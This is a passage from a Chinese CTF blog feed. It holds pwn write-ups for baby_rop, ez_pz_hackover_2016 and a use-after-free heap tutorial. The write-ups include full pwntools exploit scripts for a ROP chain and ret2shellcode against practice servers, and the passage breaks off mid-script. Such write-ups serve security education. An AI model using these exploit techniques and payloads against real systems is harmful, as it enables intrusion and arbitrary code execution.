class="line">io.interactive()</span><br></pre></td></tr></table></figure><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><ul><li>非常经典的 <code>ret2shellcode</code> ，唯一需要注意的是要能看懂汇编（虽然大概都能看懂吧）</li></ul>]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 栈溢出 </tag>
            
            <tag> ret2shellcode </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HarekazeCTF2019 baby_rop</title>
      <link href="/2024/08/28/HarekazeCTF2019-baby-rop/"/>
      <url>/2024/08/28/HarekazeCTF2019-baby-rop/</url>
      
        <content type="html"><![CDATA[<h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>先使用 <code>checksec</code> 检查</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/桌面]</span><br><span class="line">└─$ checksec ./babyrop           </span><br><span class="line">[*] &#x27;/home/kali/桌面/babyrop&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>发现为 64 位小端序，只开了 NX 保护和 RELRO</p><p>使用 IDA Pro 查看</p><p>发现 <code>system</code> 函数</p><p><img src="https://gitee.com/chpocenkey/images/raw/master/20240828084612.png" alt="image.png"></p><p>发现 <code>&#39;/bin/sh&#39;</code> 字符串</p><p><img src="https://gitee.com/chpocenkey/images/raw/master/20240828084636.png" alt="image.png"></p><p>查看 <code>main</code> 函数</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> v4[<span class="number">16</span>]; <span class="comment">// [rsp+0h] [rbp-10h] BYREF</span></span><br><span class="line"></span><br><span class="line">  system(<span class="string">&quot;echo -n \&quot;What&#x27;s your name? \&quot;&quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%s&quot;</span>, v4);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Welcome to the Pwn World, %s!\n&quot;</span>, v4);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>v4</code> 是一个栈中的变量，有 <code>0x10</code> 大小，但是在输入时没有检查，可以构造成栈溢出</p><p>由于是 64 位的，所以需要使用 ROPgadget 查找 <code>pop rdi; ret</code> 用于将变量值传递给寄存器</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/桌面]</span><br><span class="line">└─$ ROPgadget --binary ./babyrop | grep &#x27;pop rdi&#x27;       </span><br><span class="line">/usr/local/bin/ROPgadget:4: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html</span><br><span class="line">  __import__(&#x27;pkg_resources&#x27;).run_script(&#x27;ROPGadget==7.4&#x27;, &#x27;ROPgadget&#x27;)</span><br><span class="line">0x0000000000400683 : pop rdi ; ret</span><br></pre></td></tr></table></figure><p>通过 <code>v4</code> 变量的栈溢出，利用 <code>pop rdi; ret</code> 将变量值传递给寄存器，而后调用 <code>system</code> 函数，实现 <code>getshell</code></p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># python3.11.6</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">binname = <span class="string">&#x27;babyrop&#x27;</span></span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># io = process(binname)</span></span><br><span class="line">io = remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>, <span class="number">27594</span>)</span><br><span class="line"></span><br><span class="line">system_addr = <span class="number">0x0000000000400490</span></span><br><span class="line">binsh_addr = <span class="number">0x0000000000601048</span></span><br><span class="line">poprdi_addr = <span class="number">0x0000000000400683</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span> + <span class="string">b&#x27;b&#x27;</span>*<span class="number">8</span> + p64(poprdi_addr) + p64(binsh_addr) + p64(system_addr)</span><br><span class="line">io.recv()</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>经典的 ROP</p>]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 栈溢出 </tag>
            
            <tag> ROP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BUUCTF ez_pz_hackover_2016</title>
      <link href="/2024/08/28/BUUCTF-ez-pz-hackover-2016/"/>
      <url>/2024/08/28/BUUCTF-ez-pz-hackover-2016/</url>
      
        <content type="html"><![CDATA[<h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>先使用 <code>checksec</code> 检查</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/桌面]</span><br><span class="line">└─$ checksec ./ez_pz_hackover_2016 </span><br><span class="line">[*] &#x27;/home/kali/桌面/ez_pz_hackover_2016&#x27;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX unknown - GNU_STACK missing</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br><span class="line">    Stack:    Executable</span><br><span class="line">    RWX:      Has RWX segments</span><br></pre></td></tr></table></figure><p>发现是 32 位小端序，只开启了 RELRO 保护，并且栈可执行，可以考虑使用 <code>ret2shellcode</code></p><p>使用 IDA Pro 查看</p><p>简单分析后发现仅 <code>chall</code> 函数和 <code>vuln</code> 函数为重要函数需要重点分析</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">chall</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">size_t</span> v0; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">char</span> s[<span class="number">1024</span>]; <span class="comment">// [esp+Ch] [ebp-40Ch] BYREF</span></span><br><span class="line">  _BYTE *v3; <span class="comment">// [esp+40Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Yippie, lets crash: %p\n&quot;</span>, s);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Whats your name?\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;&gt; &quot;</span>);</span><br><span class="line">  fgets(s, <span class="number">1023</span>, <span class="built_in">stdin</span>);</span><br><span class="line">  v0 = <span class="built_in">strlen</span>(s);</span><br><span class="line">  v3 = <span class="built_in">memchr</span>(s, <span class="string">&#x27;\n&#x27;</span>, v0);</span><br><span class="line">  <span class="keyword">if</span> ( v3 )</span><br><span class="line">    *v3 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\nWelcome %s!\n&quot;</span>, s);</span><br><span class="line">  result = <span class="built_in">strcmp</span>(s, <span class="string">&quot;crashme&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !result )</span><br><span class="line">    <span class="keyword">return</span> vuln((<span class="type">char</span>)s, <span class="number">0x400</span>u);</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>chall</code> 函数没有突出的漏洞，输入有检查，只能输入 1023 个</p><p>将输入的内容在 <code>&#39;\n&#39;</code> 前的内容复制到 <code>s</code> 变量中，如果 <code>s</code> 变量的前 8 个字节为 <code>crashme\x00</code> ，则将 <code>s</code> 作为参数调用 <code>vuln</code> 函数</p><p>这里注意 <code>printf(&quot;Yippie, lets crash: %p\n&quot;, s);</code> 这一句，后面会用到</p><blockquote><p><code>strcmp</code> 函数用于将两个字符串自左向右逐个字符比较，直到出现不同的字符或遇到 <code>\0</code> 为止</p></blockquote><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> *__cdecl <span class="title function_">vuln</span><span class="params">(<span class="type">char</span> src, <span class="type">size_t</span> n)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> dest[<span class="number">50</span>]; <span class="comment">// [esp+6h] [ebp-32h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">memcpy</span>(dest, &amp;src, n);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>vuln</code> 函数存在栈溢出漏洞， <code>n</code> 的值为 <code>0x400</code> ， <code>src</code> 的字符最多为 <code>0x3FF</code> ，但是 <code>dest</code> 变量在栈中且最多为 <code>0x32</code> ，此处存在栈溢出漏洞</p><p>这里需要注意，实际上 <code>dest</code> 到 <code>ebp</code> 的距离不是 <code>0x32</code> 个字节，而是 <code>0x16</code> 个字节，这需要通过动态调试确定真正的距离</p><p><img src="https://gitee.com/chpocenkey/images/raw/master/20240828113759.png" alt="image.png"></p><p>输入 <code>crashme</code> 用于测试，可以轻易发现 <code>ashme</code> 字符串，实际上 <code>cr</code> 两个字符在上面 <code>0xffffd040</code> 处，所以实际输入的位置是 <code>0x14 + 0x2</code> 即 <code>0x16</code></p><p>由于栈可执行，可以向 <code>s</code> 变量中写入 <code>shellcode</code> ，执行 <code>vuln</code> 函数利用 <code>dest</code> 变量造成溢出，将返回值修改为 <code>shellcode</code> 的地址从而去执行 <code>shellcode</code></p><p>但是 <code>shellcode</code> 的地址是不知道的，所以需要通过动态调试计算出 <code>shellcode</code> 和输入的变量 <code>s</code> 的偏移，间接得到 <code>shellcode</code> 的地址</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># python3.11.6</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">binname = <span class="string">&#x27;ez_pz_hackover_2016&#x27;</span></span><br><span class="line">context(arch=<span class="string">&#x27;i386&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io = process(binname)</span><br><span class="line">gdb.attach(io) <span class="comment"># 利用gdb动调</span></span><br><span class="line">io.recvuntil(<span class="string">b&#x27;Yippie, lets crash: &#x27;</span>)</span><br><span class="line">s_addr = <span class="built_in">int</span>(io.recv(<span class="number">10</span>), <span class="number">16</span>) <span class="comment"># 接收回显的参数s在栈上的地址，长度为10，以16进制显示</span></span><br><span class="line">shellcode = asm(shellcraft.sh()) <span class="comment"># 利用 pwntools 自动生成 shellcode</span></span><br><span class="line">payload = <span class="string">b&#x27;crashme\x00&#x27;</span> + <span class="string">b&#x27;a&#x27;</span>* (<span class="number">0x16</span> - <span class="number">8</span>) + <span class="string">b&#x27;b&#x27;</span> * <span class="number">4</span> + p32(<span class="number">0</span>) + shellcode</span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;&gt; &#x27;</span>, payload)</span><br><span class="line">pause() <span class="comment"># 暂停程序</span></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/chpocenkey/images/raw/master/20240828104437.png" alt="image.png"></p><p>本次调试中 <code>s</code> 参数的位置为 <code>0xfff50c5c</code> ， <code>shellcode</code> 的位置为 <code>0xfff50c40</code> ，它们之间的偏移为 <code>0x1c</code> ，那么就得到 <code>shellcode</code> 的地址为 <code>s_addr - 0x1c</code></p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># python3.11.6</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">binname = <span class="string">&#x27;ez_pz_hackover_2016&#x27;</span></span><br><span class="line">context(arch=<span class="string">&#x27;i386&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># io = process(binname)</span></span><br><span class="line">io = remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>, <span class="number">29256</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">b&#x27;Yippie, lets crash: &#x27;</span>)</span><br><span class="line">s_addr = <span class="built_in">int</span>(io.recv(<span class="number">10</span>), <span class="number">16</span>)</span><br><span class="line">shellcode_addr = s_addr - <span class="number">0x1c</span></span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;crashme\x00&#x27;</span> + <span class="string">b&#x27;a&#x27;</span>* (<span class="number">0x16</span> - <span class="number">8</span>) + <span class="string">b&#x27;b&#x27;</span> * <span class="number">4</span> + p32(shellcode_addr) + asm(shellcraft.sh())</span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;&gt; &#x27;</span>, payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><ul><li>需要注意 <code>dest</code> 到 <code>ebp</code> 的距离，使用 IDA Pro 分析时并不一定是正确的，需要配合动态调试才能真正确定</li><li>利用偏移值可以间接确定写入 <code>shellcode</code></li></ul>]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 栈溢出 </tag>
            
            <tag> ret2shellcode </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>UAF</title>
      <link href="/2024/08/27/UAF/"/>
      <url>/2024/08/27/UAF/</url>
      
        <content type="html"><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>UAF 指释放后引用（ Use-After-Free ）漏洞，它是一种常见的内存安全问题</p><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>当程序释放了一个堆上的内存块，但后续仍然继续使用该已释放的内存块，就会产生 UAF 漏洞</p><blockquote><p>当堆溢出和 UAF 漏洞同时存在时，攻击者可以通过利用堆溢出漏洞来修改或篡改以释放的内存块，进而改变 UAF漏洞的利用条件或影响后续的使用。这种组合攻击称为堆溢出的 UAF（Heap Overflow Use-After-Free）</p></blockquote><p>但是实际上，UAF 有以下三种情况</p><ul><li>内存块被释放后，其对应的指针被设置为 NULL ，当程序再次使用这块内存时，会导致程序崩溃</li><li>内存块内释放后，其对应的指针没有被设置为 NULL ，并且在它下一次使用前，没有代码对这块内存块进行修改，当程序再次使用这块内存时，程序很有可能会正常运行</li><li>内存块内释放后，其对应的指针没有被设置为 NULL ，但是在它下一次使用前，有代码对这块内存块进行修改，当程序再次使用这块内存时，程序有可能出现奇怪的问题</li></ul><p>一般所指的 UAF 漏洞主要是后两种</p><blockquote><p>一般称被释放后没有被设置为 NULL 的内存指针为 <code>dangling pointer</code></p></blockquote><h3 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h3><h2 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h2><p>以 BUUCTF 中的 <a href="https://buuoj.cn/challenges#actf_2019_babyheap">actf_2019_babyheap</a> 为例</p><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><h4 id="main-函数"><a href="#main-函数" class="headerlink" title="main 函数"></a>main 函数</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> __fastcall __noreturn <span class="title function_">main</span><span class="params">(__int64 a1, <span class="type">char</span> **a2, <span class="type">char</span> **a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">24</span>]; <span class="comment">// [rsp+10h] [rbp-20h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v5; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  init0();</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      menu();</span><br><span class="line">      read(<span class="number">0</span>, buf, <span class="number">8uLL</span>);</span><br><span class="line">      v3 = atoi(buf);</span><br><span class="line">      <span class="keyword">if</span> ( v3 != <span class="number">2</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      delete();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v3 == <span class="number">3</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      print();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v3 != <span class="number">1</span> )</span><br><span class="line">        bye();</span><br><span class="line">      create();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="menu-函数"><a href="#menu-函数" class="headerlink" title="menu 函数"></a>menu 函数</h4><p>经典菜单，程序中有 4 个功能，创建、删除、显示、退出，之后程序会根据用于的输入执行相应的功能</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">menu</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> __int64 v1; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v1 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;==============================&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot; This is a heap exploit demo  &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;==============================&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;1. Create something           &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;2. Delete something           &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;3. Print something            &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;4. Exit                       &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;==============================&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Now the time is &quot;</span>);</span><br><span class="line">  system(<span class="string">&quot;date&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Your choice: &quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="create-函数"><a href="#create-函数" class="headerlink" title="create 函数"></a>create 函数</h4><p>创建堆块时，先创建一个 <code>0x10</code> 大小的堆块，然后将 <code>sub_40098A</code> 函数的地址放到 <code>*((_QWORD *)*(&amp;ptr + i) + 1)</code> 中（在 <code>print</code> 函数中会使用到），然后输入想要创建的堆块大小 <code>size</code> ，再使用该 <code>size</code> 创建一个新的堆块，储存到 <code>((_QWORD *)*(&amp;ptr + i))</code> 中，并输入 <code>content</code> 内容并存储到该堆块中</p><p>根据以上内容模拟一个 Node 结构体，</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">Node &#123;</span><br><span class="line"><span class="type">char</span> *content; <span class="comment">// content 内容</span></span><br><span class="line"><span class="type">int</span> *<span class="title function_">sub_40098A</span><span class="params">(<span class="type">const</span> <span class="type">char</span> * a1)</span>; <span class="comment">// sub_40098A 用于输出的函数的地址</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">create</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">void</span> **v0; <span class="comment">// rbx</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+8h] [rbp-38h]</span></span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// [rsp+Ch] [rbp-34h]</span></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">24</span>]; <span class="comment">// [rsp+10h] [rbp-30h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v5; <span class="comment">// [rsp+28h] [rbp-18h]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( dword_60204C &lt;= <span class="number">5</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">4</span>; ++i )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( !*(&amp;ptr + i) )</span><br><span class="line">      &#123;</span><br><span class="line">        *(&amp;ptr + i) = <span class="built_in">malloc</span>(<span class="number">0x10</span>uLL);</span><br><span class="line">        *((_QWORD *)*(&amp;ptr + i) + <span class="number">1</span>) = sub_40098A;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Please input size: &quot;</span>);</span><br><span class="line">        read(<span class="number">0</span>, buf, <span class="number">8uLL</span>);</span><br><span class="line">        v3 = atoi(buf);</span><br><span class="line">        v0 = (<span class="type">void</span> **)*(&amp;ptr + i);</span><br><span class="line">        *v0 = <span class="built_in">malloc</span>(v3);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Please input content: &quot;</span>);</span><br><span class="line">        read(<span class="number">0</span>, *(<span class="type">void</span> **)*(&amp;ptr + i), v3);</span><br><span class="line">        ++dword_60204C;</span><br><span class="line">        <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v5;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;The list is full&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v5;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="delete"><a href="#delete" class="headerlink" title="delete"></a>delete</h4><p>输入 <code>index</code> 以获得想要删除的堆块编号，通过简单的验证后就将堆块删除，但是需要注意的是，这里在删除后没有进行置空，所以这里存在 UAF 漏洞可供利用</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">delete</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v1; <span class="comment">// [rsp+Ch] [rbp-24h]</span></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">24</span>]; <span class="comment">// [rsp+10h] [rbp-20h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v3; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Please input list index: &quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">4uLL</span>);</span><br><span class="line">  v1 = atoi(buf);</span><br><span class="line">  <span class="keyword">if</span> ( v1 &gt;= <span class="number">0</span> &amp;&amp; v1 &lt; dword_60204C )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( *(&amp;ptr + v1) )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">free</span>(*(<span class="type">void</span> **)*(&amp;ptr + v1));</span><br><span class="line">      <span class="built_in">free</span>(*(&amp;ptr + v1));</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Out of bound!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="print-函数"><a href="#print-函数" class="headerlink" title="print 函数"></a>print 函数</h4><p>输入 <code>index</code> 以获得想要删除的堆块编号，通过简单的验证后就将堆块进行输出，此处 <code>(*((void (__fastcall **)(_QWORD))*(&amp;ptr + v1) + 1))</code> 在 <code>create</code> 函数中有出现，可以便捷地理解为 <code>sub_40098A</code> 函数</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">print</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v1; <span class="comment">// [rsp+Ch] [rbp-24h]</span></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">24</span>]; <span class="comment">// [rsp+10h] [rbp-20h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v3; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Please input list index: &quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">4uLL</span>);</span><br><span class="line">  v1 = atoi(buf);</span><br><span class="line">  <span class="keyword">if</span> ( v1 &gt;= <span class="number">0</span> &amp;&amp; v1 &lt; dword_60204C )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( *(&amp;ptr + v1) )</span><br><span class="line">      (*((<span class="type">void</span> (__fastcall **)(_QWORD))*(&amp;ptr + v1) + <span class="number">1</span>))(*(_QWORD *)*(&amp;ptr + v1));</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Out of bound!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h4><p>这里主要利用位于 <code>delete</code> 函数中的 UAF 漏洞，先创建两个堆块 <code>NodeA</code> 和 <code>NodeB</code> ，它们分别自动创建了 <code>ContentA</code> 和 <code>ContentB</code> ，大小自定义为 <code>0x100</code> （此处注意将 <code>Content</code> 的大小设置得距离 <code>0x10</code> 远一点就行了）</p><p><img src="https://gitee.com/chpocenkey/images/raw/master/draw.png" alt="draw.png"></p><p>而后将两个堆块释放，此时由于 <code>glibc</code> 的回收机制， <code>NodeA</code> 和 <code>NodeB</code> 以及 <code>ContentA</code> 和 <code>ContentB</code> 不会在同一个 <code>bin</code> 中（因为之前的 <code>ContentA</code> 和 <code>ContentB</code> 的大小是自己设的，与 <code>0x10</code> 有距离较大）</p><p><img src="https://gitee.com/chpocenkey/images/raw/master/draw1.png" alt="draw1.png"></p><p>此时再申请一个堆块 <code>NodeC</code> ，它创建的 <code>ContentC</code> 大小设为 <code>0x10</code> ，这样 <code>NodeC == NodeB</code> 并且 <code>ContentC == NodeA</code> ，因为当创建堆块 <code>C</code> 时，首先创建 <code>NodeC</code> ，由于 <code>NodeC</code> 的大小固定为 <code>0x10</code> ，所以 <code>glibc</code> 将大小为 <code>0x10</code> 的 <code>free</code> 掉的堆块 <code>NodeB</code> 给了 <code>NodeC</code> ，之后再申请一个堆块 <code>ContentC</code> 时，此时我们自定义的大小仍然为 <code>0x10</code> ，所以将另一个 <code>free</code> 掉的 <code>0x10</code> 大小的堆块 <code>NodeA</code> 给了 <code>ContentC</code></p><p><img src="https://gitee.com/chpocenkey/images/raw/master/draw2.png" alt="draw2.png"></p><p>但是此时需要注意， <code>NodeA</code> 仍然是可以根据 <code>index</code> 进行操作的，因为 <code>delete</code> 函数只是单纯的 <code>free</code> 掉堆块，没有进行善后</p><p>于是可以通过在调用 <code>create</code> 函数创建 <code>NodeC</code> 时输入 <code>ContentC</code> 的值从而改变 <code>NodeA</code> 的值<br><code>Node</code> 的数据结构之前猜测为</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">Node &#123;</span><br><span class="line"><span class="type">char</span> *content; <span class="comment">// content 内容</span></span><br><span class="line"><span class="type">int</span> *<span class="title function_">sub_40098A</span><span class="params">(<span class="type">const</span> <span class="type">char</span> * a1)</span>; <span class="comment">// sub_40098A 用于输出的函数的地址</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>它的两个内容都是指针，可以通过将 <code>&#39;/bin/sh&#39;</code> 的地址和 <code>system</code> 函数的地址写入从而 <code>getshell</code></p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># python 3.11.6</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span 